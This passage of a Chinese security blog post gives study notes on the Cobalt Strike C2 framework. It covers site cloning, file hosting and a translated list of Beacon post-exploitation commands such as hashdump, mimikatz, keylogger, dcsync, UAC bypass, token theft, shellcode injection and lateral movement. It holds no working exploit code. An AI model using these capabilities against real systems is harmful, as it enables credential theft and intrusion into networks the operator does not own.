+<p><img src="/../images/image-20231011234520222.png" alt="image-20231011234520222"></p>
+<p>克隆效果</p>
+<p><img src="/../images/image-20231011234648231.png" alt="image-20231011234648231"></p>
+<h3 id="HostFile"><a href="#HostFile" class="headerlink" title="HostFile"></a>HostFile</h3><p>作用相当于用http.server起了一个web服务，将文件上传到CS服务端上提供远程文件下载</p>
+<p><img src="/../images/image-20231011234004732.png" alt="image-20231011234004732"></p>
+<h3 id="Manager"><a href="#Manager" class="headerlink" title="Manager"></a>Manager</h3><p>用来管理上述功能使用时创建的Web 站点</p>
+<p><img src="/../images/image-20231011234837927.png" alt="image-20231011234837927"></p>
+<h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><h2 id="Beacon-管理"><a href="#Beacon-管理" class="headerlink" title="Beacon 管理"></a>Beacon 管理</h2><p>在 Beacon 会话上右击 <code>interact</code>（交互）即可打开 Beacon 控制台</p>
+<p><strong>Beacon 菜单</strong></p>
+<p>Access：包含了一些对凭据的操作及提权的选项</p>
+<p>Explore：包含了信息探测与目标交互的选项</p>
+<p>Pivoting：包含了一些设置代理隧道的选项</p>
+<p>Session：包含了对当前 Beacon 会话管理的选项</p>
+<p><strong>Beacon 命令</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Beacon Commands</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line"> Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    argue                     进程参数欺骗</span><br><span class="line">    blockdlls                 阻止子进程加载非Microsoft DLL</span><br><span class="line">    browserpivot              注入受害者浏览器进程</span><br><span class="line">    bypassuac                 绕过UAC提升权限</span><br><span class="line">    cancel                    取消正在进行的下载</span><br><span class="line">    <span class="built_in">cd</span>                        切换目录</span><br><span class="line">    checkin                   强制让被控端回连一次</span><br><span class="line">    clear                     清除beacon内部的任务队列</span><br><span class="line">    connect                   Connect to a Beacon peer over TCP</span><br><span class="line">    covertvpn                 部署Covert VPN客户端</span><br><span class="line">    <span class="built_in">cp</span>                        复制文件</span><br><span class="line">    dcsync                    从DC中提取密码哈希</span><br><span class="line">    desktop                   远程桌面(VNC)</span><br><span class="line">    dllinject                 反射DLL注入进程</span><br><span class="line">    dllload                   使用LoadLibrary将DLL加载到进程中</span><br><span class="line">    download                  下载文件</span><br><span class="line">    downloads                 列出正在进行的文件下载</span><br><span class="line">    drives                    列出目标盘符</span><br><span class="line">    elevate                   使用exp</span><br><span class="line">    execute                   在目标上执行程序(无输出)</span><br><span class="line">    execute-assembly          在目标上内存中执行本地.NET程序</span><br><span class="line">    <span class="built_in">exit</span>                      终止beacon会话</span><br><span class="line">    getprivs                  Enable system privileges on current token</span><br><span class="line">    getsystem                 尝试获取SYSTEM权限</span><br><span class="line">    getuid                    获取用户ID</span><br><span class="line">    hashdump                  转储密码哈希值</span><br><span class="line">    <span class="built_in">help</span>                      帮助</span><br><span class="line">    inject                    在注入进程生成会话</span><br><span class="line">    jobkill                   结束一个后台任务</span><br><span class="line">    <span class="built_in">jobs</span>                      列出后台任务</span><br><span class="line">    kerberos_ccache_use       从ccache文件中导入票据应用于此会话</span><br><span class="line">    kerberos_ticket_purge     清除当前会话的票据</span><br><span class="line">    kerberos_ticket_use       Apply 从ticket文件中导入票据应用于此会话</span><br><span class="line">    keylogger                 键盘记录</span><br><span class="line">    <span class="built_in">kill</span>                      结束进程</span><br><span class="line">    <span class="built_in">link</span>                      Connect to a Beacon peer over a named pipe</span><br><span class="line">    logonpasswords            使用mimikatz转储凭据和哈希值</span><br><span class="line">    <span class="built_in">ls</span>                        列出文件</span><br><span class="line">    make_token                创建令牌以传递凭据</span><br><span class="line">    mimikatz                  运行mimikatz</span><br><span class="line">    <span class="built_in">mkdir</span>                     创建一个目录</span><br><span class="line">    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line">    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode http                 使用HTTP作为通信通道</span><br><span class="line">    <span class="built_in">mv</span>                        移动文件</span><br><span class="line">    net                       net命令</span><br><span class="line">    note                      备注       </span><br><span class="line">    portscan                  进行端口扫描</span><br><span class="line">    powerpick                 通过Unmanaged PowerShell执行命令</span><br><span class="line">    powershell                通过powershell.exe执行命令</span><br><span class="line">    powershell-import         导入powershell脚本</span><br><span class="line">    ppid                      Set parent PID <span class="keyword">for</span> spawned post-ex <span class="built_in">jobs</span></span><br><span class="line">    ps                        显示进程列表</span><br><span class="line">    psexec                    Use a service to spawn a session on a host</span><br><span class="line">    psexec_psh                Use PowerShell to spawn a session on a host</span><br><span class="line">    psinject                  在特定进程中执行PowerShell命令</span><br><span class="line">    pth                       使用Mimikatz进行传递哈希</span><br><span class="line">    <span class="built_in">pwd</span>                       当前目录位置</span><br><span class="line">    reg                       Query the registry</span><br><span class="line">    rev2self                  恢复原始令牌</span><br><span class="line">    <span class="built_in">rm</span>                        删除文件或文件夹</span><br><span class="line">    rportfwd                  端口转发</span><br><span class="line">    run                       在目标上执行程序(返回输出)</span><br><span class="line">    runas                     以其他用户权限执行程序</span><br><span class="line">    runasadmin                在高权限下执行程序</span><br><span class="line">    runu                      Execute a program under another PID</span><br><span class="line">    screenshot                屏幕截图</span><br><span class="line">    setenv                    设置环境变量</span><br><span class="line">    shell                     执行cmd命令</span><br><span class="line">    shinject                  将shellcode注入进程</span><br><span class="line">    shspawn                   启动一个进程并将shellcode注入其中</span><br><span class="line">    <span class="built_in">sleep</span>                     设置睡眠延迟时间</span><br><span class="line">    socks                     启动SOCKS4代理</span><br><span class="line">    socks stop                停止SOCKS4</span><br><span class="line">    spawn                     Spawn a session </span><br><span class="line">    spawnas                   Spawn a session as another user</span><br><span class="line">    spawnto                   Set executable to spawn processes into</span><br><span class="line">    spawnu                    Spawn a session under another PID</span><br><span class="line">    ssh                       使用ssh连接远程主机</span><br><span class="line">    ssh-key                   使用密钥连接远程主机</span><br><span class="line">    steal_token               从进程中窃取令牌</span><br><span class="line">    timestomp                 将一个文件的时间戳应用到另一个文件</span><br><span class="line">    <span class="built_in">unlink</span>                    Disconnect from parent Beacon</span><br><span class="line">    upload                    上传文件</span><br><span class="line">    wdigest                   使用mimikatz转储明文凭据</span><br><span class="line">    winrm                     使用WinRM横向渗透</span><br><span class="line">    wmi                       使用WMI横向渗</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如果不知道怎么使用这些命令，通过 help 跟上具体命令 <code>help &lt;command&gt;</code>，会输出具体使用说明。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">help</span> <span class="built_in">ls</span></span><br><span class="line">Use: <span class="built_in">ls</span> [folder]</span><br><span class="line"></span><br><span class="line">Lists files <span class="keyword">in</span> a folder</span><br></pre></td></tr></table></figure>
+
+<p><code>[folder]</code> 是必选的参数 如果遇到尖括号如 <code>&lt;argrument name&gt;</code> 就是可选参数。</p>
+<h2 id="MSF与CS互相派生"><a href="#MSF与CS互相派生" class="headerlink" title="MSF与CS互相派生"></a>MSF与CS互相派生</h2><h1 id="插件增强"><a href="#插件增强" class="headerlink" title="插件增强"></a>插件增强</h1><p><a target="_blank" rel="noopener" href="https://github.com/lintstar/LSTAR">GitHub - lintstar&#x2F;LSTAR: LSTAR - CobaltStrike 综合后渗透插件</a> <a target="_blank" rel="noopener" href="https://github.com/pandasec888/taowu-cobalt-strike">GitHub - pandasec888&#x2F;taowu-cobalt-strike</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/pandasec888/taowu-cobalt_strike">pandasec888&#x2F;taowu-cobalt_strike (github.com)</a></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>作者老版本官方教程中文翻译<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16b411i7n5/">https://www.bilibili.com/video/BV16b411i7n5/</a></p>
+<p><a target="_blank" rel="noopener" href="https://teamssix.com/201023-192553.html#toc-heading-20">【建议收藏】CS学习笔记合集 | TeamsSix</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.ateam.qianxin.com/post/cobalt-strike-40-shou-ce-fan-yi-2019-nian-12-yue-2-ri-geng-xin-ban-ben/">Cobalt Strike 4.0 手册翻译 (2019年12月2日更新版本) - 奇安信A-TEAM技术博客 (qianxin.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.raingray.com/archives/4385.html#C2+%E4%BD%BF%E7%94%A8">Red Team: Infrastructure - raingray Blog</a></p>
+</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://fgtbnc.github.io/images/wallhaven-wyg7g6.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/05/31/bugku%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"><img class="prev-cover" src="https://fgtbnc.github.io/images/wallhaven-vg3qk8.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">bugku 应急响应</div></div></a></div><div class="next-post pull-right"><a href="/2023/05/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/"><img class="next-cover" src="https://fgtbnc.github.io/images/wallhaven-xlz933.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2022 安洵杯</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/Khazing/typora-img/main/16870577801892f4a9c5aac2e9e5422a6ccd26db10dd88c73.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Khaz</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">73</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">脚本小子的学习笔记</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#C2%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.</span> <span class="toc-text">C2是什么</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cobal-Strike%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.</span> <span class="toc-text">Cobal Strike是什么</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">简单使用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C"><span class="toc-number">4.</span> <span class="toc-text">基础操作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8F%9C%E5%8D%95%E6%A0%8FCobal-Strike"><span class="toc-number">4.1.</span> <span class="toc-text">菜单栏Cobal Strike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8F%9C%E5%8D%95%E6%A0%8FViews%EF%BC%88%E8%A7%86%E5%9B%BE%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">菜单栏Views（视图）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8F%9C%E5%8D%95%E6%A0%8FReporting%EF%BC%88%E6%8A%A5%E5%91%8A%EF%BC%89"><span class="toc-number">4.3.</span> <span class="toc-text">菜单栏Reporting（报告）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E8%88%AA%E6%A0%8F"><span class="toc-number">4.4.</span> <span class="toc-text">导航栏</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD"><span class="toc-number">5.</span> <span class="toc-text">基础设施</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E5%99%A8Listeners"><span class="toc-number">5.1.</span> <span class="toc-text">监听器Listeners</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Beacon"><span class="toc-number">5.2.</span> <span class="toc-text">Beacon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Beacon%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">5.2.1.</span> <span class="toc-text">Beacon是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Beacon%E7%9A%84%E7%B1%BB%E5%9E%8B%E2%80%93%E5%BE%85%E5%AD%A6%E4%B9%A0"><span class="toc-number">5.2.2.</span> <span class="toc-text">Beacon的类型–待学习</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Attacks%EF%BC%88%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">Attacks（攻击）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Packages%EF%BC%88%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%EF%BC%89"><span class="toc-number">6.1.</span> <span class="toc-text">Packages（生成木马）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML-Application-Attack%EF%BC%88HTA-Attack%EF%BC%89"><span class="toc-number">6.1.1.</span> <span class="toc-text">HTML Application Attack（HTA Attack）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS-Office-Macro%E2%80%93%E5%BE%85%E5%AD%A6%E4%B9%A0"><span class="toc-number">6.1.2.</span> <span class="toc-text">MS Office Macro–待学习</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-Gennerator"><span class="toc-number">6.1.3.</span> <span class="toc-text">Payload Gennerator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Executable-x2F-Executable-S"><span class="toc-number">6.1.4.</span> <span class="toc-text">Windows Executable&#x2F;Executable (S)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Drive-by%EF%BC%88%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">6.2.</span> <span class="toc-text">Web Drive-by（钓鱼攻击）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#System-Profier"><span class="toc-number">6.2.1.</span> <span class="toc-text">System Profier</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Clone-site%EF%BC%88%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%EF%BC%89"><span class="toc-number">6.2.2.</span> <span class="toc-text">Clone site（克隆网站）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HostFile"><span class="toc-number">6.2.3.</span> <span class="toc-text">HostFile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Manager"><span class="toc-number">6.2.4.</span> <span class="toc-text">Manager</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">7.</span> <span class="toc-text">后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Beacon-%E7%AE%A1%E7%90%86"><span class="toc-number">7.1.</span> <span class="toc-text">Beacon 管理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E4%B8%8ECS%E4%BA%92%E7%9B%B8%E6%B4%BE%E7%94%9F"><span class="toc-number">7.2.</span> <span class="toc-text">MSF与CS互相派生</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6%E5%A2%9E%E5%BC%BA"><span class="toc-number">8.</span> <span class="toc-text">插件增强</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">9.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/10/07/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F%E4%B9%8BBadUsb/" title="近源渗透之BadUSB"><img src="https://fgtbnc.github.io/images/wallhaven-r29l9q.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="近源渗透之BadUSB"/></a><div class="content"><a class="title" href="/2023/10/07/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F%E4%B9%8BBadUsb/" title="近源渗透之BadUSB">近源渗透之BadUSB</a><time datetime="2023-10-07T11:48:25.000Z" title="发表于 2023-10-07 19:48:25">2023-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/05/Web%E5%AE%89%E5%85%A8%E4%B9%8BJSONP%E4%B8%8ECORS/" title="JSONP与CORS"><img src="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JSONP与CORS"/></a><div class="content"><a class="title" href="/2023/10/05/Web%E5%AE%89%E5%85%A8%E4%B9%8BJSONP%E4%B8%8ECORS/" title="JSONP与CORS">JSONP与CORS</a><time datetime="2023-10-05T14:00:25.000Z" title="发表于 2023-10-05 22:00:25">2023-10-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/03/%E5%B8%B8%E8%A7%81%E7%82%B9%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E5%B0%8F%E7%BB%93/" title="Pentest Note"><img src="https://fgtbnc.github.io/images/wallhaven-yxe8kk.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pentest Note"/></a><div class="content"><a class="title" href="/2023/08/03/%E5%B8%B8%E8%A7%81%E7%82%B9%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E5%B0%8F%E7%BB%93/" title="Pentest Note">Pentest Note</a><time datetime="2023-08-03T11:48:25.000Z" title="发表于 2023-08-03 19:48:25">2023-08-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/03/%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E8%AE%B0%E5%BD%95/" title="常见应用记录"><img src="https://fgtbnc.github.io/images/wallhaven-wyg7g6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="常见应用记录"/></a><div class="content"><a class="title" href="/2023/08/03/%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E8%AE%B0%E5%BD%95/" title="常见应用记录">常见应用记录</a><time datetime="2023-08-03T11:46:25.000Z" title="发表于 2023-08-03 19:46:25">2023-08-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/26/Web%E5%AE%89%E5%85%A8%E4%B9%8BMysql%E6%B3%A8%E5%85%A5/" title="Sql注入详解--Mysql"><img src="https://fgtbnc.github.io/images/wallhaven-xlz933.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Sql注入详解--Mysql"/></a><div class="content"><a class="title" href="/2023/06/26/Web%E5%AE%89%E5%85%A8%E4%B9%8BMysql%E6%B3%A8%E5%85%A5/" title="Sql注入详解--Mysql">Sql注入详解--Mysql</a><time datetime="2023-06-26T11:52:40.000Z" title="发表于 2023-06-26 19:52:40">2023-06-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By Khaz</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script src="/js/chocolate.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
